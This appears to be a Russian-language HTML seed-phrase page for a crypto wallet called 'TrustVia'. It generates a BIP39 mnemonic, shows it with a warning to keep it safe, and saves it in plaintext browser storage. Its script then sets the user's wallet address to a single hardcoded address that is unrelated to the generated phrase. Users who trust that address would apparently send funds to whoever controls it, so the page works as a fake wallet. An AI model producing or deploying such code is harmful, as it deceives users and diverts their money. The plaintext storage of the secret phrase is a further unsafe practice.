<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TrustVia — Секретная фраза</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/index.min.js"></script>
    <style>
        body {
            background: #0b0b0b;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            margin: 0;
            min-height: 100dvh;
        }

        .header {
            padding: 24px 20px;
            display: flex;
            align-items: center;
            background: rgba(11,11,11,0.9);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid #1a1a1a;
        }

        .back-btn {
            font-size: 40px;
            color: #00d676;
            cursor: pointer;
            font-weight: bold;
        }

        h1 {
            flex: 1;
            text-align: center;
            font-size: 36px;
            font-weight: 900;
            margin: 0;
        }

        .warning {
            color: #ffcc00;
            font-size: 17px;
            text-align: center;
            margin: 32px 0;
            padding: 0 20px;
            line-height: 1.5;
        }

        .word-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 16px;
            background: #111;
            padding: 32px 24px;
            border-radius: 28px;
            border: 1px solid #222;
            margin: 40px 20px;
            box-shadow: inset 0 4px 20px rgba(0,0,0,0.7);
        }

        .word-item {
            background: #1a1a1a;
            padding: 16px;
            border-radius: 16px;
            text-align: center;
            font-size: 17px;
            font-family: monospace;
            color: #eee;
            box-shadow: inset 0 2px 6px rgba(0,0,0,0.6);
            transition: all 0.3s;
        }

        .word-item:hover {
            transform: scale(1.06);
            background: #222;
            box-shadow: 0 0 20px rgba(0,214,118,0.2);
        }

        .btn {
            background: linear-gradient(135deg, #00d676, #00ff9d);
            color: black;
            font-weight: 700;
            border-radius: 9999px;
            padding: 20px;
            width: 90%;
            max-width: 360px;
            font-size: 18px;
            margin: 48px auto 0;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 12px 48px rgba(0,214,118,0.45);
        }

        .btn:hover {
            transform: translateY(-8px) scale(1.05);
            box-shadow: 0 20px 70px rgba(0,214,118,0.6);
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="back-btn" onclick="history.back()">←</div>
        <h1>Секретная фраза</h1>
    </div>

    <p class="warning">Запишите эти слова в правильном порядке и храните в безопасном месте. Никогда не делитесь ими!</p>

    <div class="word-grid" id="word-grid"></div>

    <button class="btn" onclick="handleCreate()">Я записал фразу</button>

    <script>
        const mnemonic = bip39.generateMnemonic();
        const words = mnemonic.split(' ');
        let html = '';
        words.forEach((word, i) => {
            html += `<div class="word-item">${i + 1}. ${word}</div>`;
        });
        document.getElementById('word-grid').innerHTML = html;

        function handleCreate() {
            localStorage.setItem('mnemonic', mnemonic);
            localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
            window.location.href = 'index.html';
        }
    </script>

</body>
</html>
